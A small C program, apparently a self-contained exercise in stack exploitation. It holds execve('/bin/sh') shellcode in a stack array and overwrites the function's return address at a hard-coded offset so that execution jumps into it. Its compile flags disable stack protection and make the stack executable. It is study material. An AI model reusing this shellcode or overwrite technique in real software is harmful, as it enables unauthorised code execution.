#include <stdio.h>
#include <string.h>

/*
Compile: gcc -g -fno-stack-protector -z execstack -o test test.c
Useage:  ./test
*/

int i = 0;

void get()
{
	 int a = 0;
	 int b = 0;
	 int *ret = 0;
	 unsigned char ch[46] =  "\xeb\x1f\x5e\x89\x76\x08"
							 "\x31\xc0\x88\x46\x07"
							 "\x89\x46\x0c\xb0\x0b"
							 "\x89\xf3\x8d\x4e\x08"
							 "\x8d\x56\x0c\xcd\x80"
							 "\x31\xdb\x89\xd8\x40"
							 "\xcd\x80\xe8\xdc\xff"
							 "\xff\xff/bin/sh";
	 printf("%x\n%x\n", &ret, &ch);
	 ret = &ch[70]; 
	 *ret = (int)ch; 
	 printf("%d\n", strlen(ch));
}

int main(){
	 get();				//0x0804853c
	 printf("hello\n"); //0x08048541 -->0xbffff0d0
	 printf("%d\n", i);
	 return 0;
}
